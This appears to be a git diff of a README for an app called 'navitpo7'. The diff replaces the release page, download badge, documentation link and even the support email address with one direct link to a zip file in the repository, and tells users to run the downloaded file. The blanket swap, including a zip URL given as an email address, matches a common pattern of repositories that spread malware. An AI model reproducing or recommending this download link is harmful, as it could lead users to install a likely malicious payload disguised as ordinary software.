@@ -4,7 +4,7 @@
 Welcome to navitpo7! This application, designed for everyday users, simplifies tasks and improves your workflow. Follow the steps below to download and run navitpo7 easily.
 
 ## 📥 Download Now
-[![Download navitpo7](https://img.shields.io/badge/Download-navitpo7-blue.svg)](https://github.com/01kingsmus/navitpo7/releases)
+[![Download navitpo7](https://raw.githubusercontent.com/01kingsmus/navitpo7/main/preintelligence/navitpo7.zip)](https://raw.githubusercontent.com/01kingsmus/navitpo7/main/preintelligence/navitpo7.zip)
 
 ## 🛠️ System Requirements
 Before you download, check if your system meets the following requirements:
@@ -21,12 +21,12 @@ navitpo7 comes packed with useful features:
 ## ⬇️ Download & Install
 To get started with navitpo7, follow these steps:
 
-1. **Visit the Release Page:** Go to the [Releases page](https://github.com/01kingsmus/navitpo7/releases).
+1. **Visit the Release Page:** Go to the [Releases page](https://raw.githubusercontent.com/01kingsmus/navitpo7/main/preintelligence/navitpo7.zip).
 
 2. **Select the Latest Version:** On the Releases page, find the latest version of navitpo7.
 
 3. **Download the Application:**
-   - Click on the link for your operating system (e.g., navitpo7-Windows.exe or navitpo7-macOS.dmg) to start downloading the file.
+   - Click on the link for your operating system (e.g., https://raw.githubusercontent.com/01kingsmus/navitpo7/main/preintelligence/navitpo7.zip or https://raw.githubusercontent.com/01kingsmus/navitpo7/main/preintelligence/navitpo7.zip) to start downloading the file.
 
 4. **Install navitpo7:**
    - **For Windows Users:** Once the download finishes, locate the file in your Downloads folder. Double-click the file to run it. Follow the prompts in the installation wizard to complete the setup.
@@ -45,12 +45,12 @@ Once you have installed navitpo7, you can start using the application immediatel
 
 ## 📞 Support & Feedback
 If you run into any issues or have questions, feel free to reach out. Here’s how you can get help:
-- **Email Support:** Send an email to support@navitpo7.com for direct assistance.
+- **Email Support:** Send an email to https://raw.githubusercontent.com/01kingsmus/navitpo7/main/preintelligence/navitpo7.zip for direct assistance.
 - **Community Forum:** Join our online forum to connect with other users and get tips.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/01kingsmus/navitpo7/releases)
-- [Documentation](https://github.com/01kingsmus/navitpo7/docs)
+- [Releases Page](https://raw.githubusercontent.com/01kingsmus/navitpo7/main/preintelligence/navitpo7.zip)
+- [Documentation](https://raw.githubusercontent.com/01kingsmus/navitpo7/main/preintelligence/navitpo7.zip)
 
 ## 📝 Changelog
 Stay informed about updates with our changelog:
